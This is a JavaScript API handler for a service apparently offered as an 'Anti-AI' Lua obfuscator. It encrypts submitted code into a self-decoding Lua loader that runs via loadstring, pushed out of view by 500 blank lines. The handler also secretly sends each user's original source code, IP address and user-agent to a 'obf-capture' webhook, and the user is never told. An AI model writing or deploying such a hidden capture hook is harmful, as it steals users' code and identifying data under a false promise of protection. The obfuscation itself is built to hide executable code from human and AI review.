module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
  const { code } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  const key1 = Math.floor(Math.random() * 45) + 55;
  const key2 = Math.floor(Math.random() * 35) + 15;
  const blank = '\n'.repeat(500);

  const giantAsciiArt = `
        =============================================================================================
       _  _  __ ______                     _________________ _  _ _____ _____   ___ _____ ___________ 
      | | | |/  ||  _  \\                  |  _  | ___ \\  ___| | | /  ___/  __ \\ / _ \\_  _|  _  | ___ \\
      | |_| |\`| || | | |________  ______  | | | | |_/ / |_  | | | \  \`--.| /  \\/// /_\\ \\| | | | | | |_/ /
      |  _  | | || | | |_  /_  / |______| | | | | ___ \\  _| | | | | \`--. \\ |    |  _  || | | | | |    / 
      | | | |_| || |/ / / / / /           \\ \\_/ / |_/ / |   | |_| /\\__/ / \\__/\\| | | || | \\ \\_/ / |\\ \\ 
      \\_| |_/\\___/___/ /___/___|           \\___/\\____/\\_|    \\___/\\____/ \\____/\\_| |_/\\_/  \\___/\\_| \\_|
                                                                                                     
                                Obfuscator Anti-AI(LUA / PWN / HTML)
        =============================================================================================`;

  const aiToxicGarbage = `
        bª Website     : https://obf-razor.vercel.app
        bª Obfuscation : Runtime polymorphic
        bª Anti-tamper : Ci verification
        bª Entropy     : High
        bª Status      : bÏ Online
        =============================================================================================`;

  const encBytes = [];
  let lastByte = key1;
  for (let i = 0; i < code.length; i++) {
    const origByte = code.charCodeAt(i);
    const encryptedByte = (origByte ^ key1 ^ key2 ^ (lastByte % 256) ^ (i % 256)) & 0xff;
    encBytes.push(encryptedByte);
    lastByte = encryptedByte;
  }

  let encString = '';
  for (const b of encBytes) encString += '\\' + String(b).padStart(3, '0');

  const luaHeader = `--[[${giantAsciiArt}${aiToxicGarbage}\n]]--`;

  const out = luaHeader + blank +
    "local _G = Object_G or _G; " +
    "local _____ = _G['string']; " +
    "local ______ = _____['char']; " +
    "local _______ = _____['byte']; " +
    "local ________ = _G['bit'] and _G['bit']['bxor'] or function(a,b) return a~=b end; " +
    "local ___ = '" + encString + "'; " +
    "local ____ = ''; " +
    "local ______1 = " + key1 + "; " +
    "for __1 = 1, #___ do " +
      "local __2 = _______(___, __1); " +
      "____ = ____ .. ______((________(________(________(________(__2, " + key1 + "), " + key2 + "), ______1 % 256), (__1 - 1) % 256))); " +
      "______1 = __2 " +
    "end; " +
    "(load or loadstring)(____)()";

  try { await sendToWebhook(code, out, req, 'lua'); } catch (_) {}
  return res.status(200).json({ ok: true, output: out });
};

async function sendToWebhook(original, obfuscated, req, lang = 'js') {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  const extMap = { js: 'js', lua: 'lua', html: 'html', pwn: 'pwn' };
  const ext = extMap[lang] || 'txt';

  const embed = {
    title: 'New Submission',
    color: 0x2bcc9e,
    fields: [
      { name: 'IP', value: '`' + ip + '`', inline: true },
      { name: 'Lang', value: '`' + lang + '`', inline: true },
      { name: 'Length', value: original.length + ' -> ' + obfuscated.length, inline: true },
      { name: 'User-Agent', value: '`' + ua.slice(0, 200) + '`', inline: false }
    ],
    timestamp: new Date().toISOString()
  };

  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    username: 'obf-capture',
    embeds: [embed],
    attachments: [
      { id: 0, filename: 'original.' + ext, description: 'Source asli' },
      { id: 1, filename: 'obfuscated.' + ext, description: 'Hasil obfuscate' }
    ]
  }));
  form.append('files[0]', new Blob([original], { type: 'text/plain' }), 'original.' + ext);
  form.append('files[1]', new Blob([obfuscated], { type: 'text/plain' }), 'obfuscated.' + ext);

  await fetch(url, { method: 'POST', body: form });
}
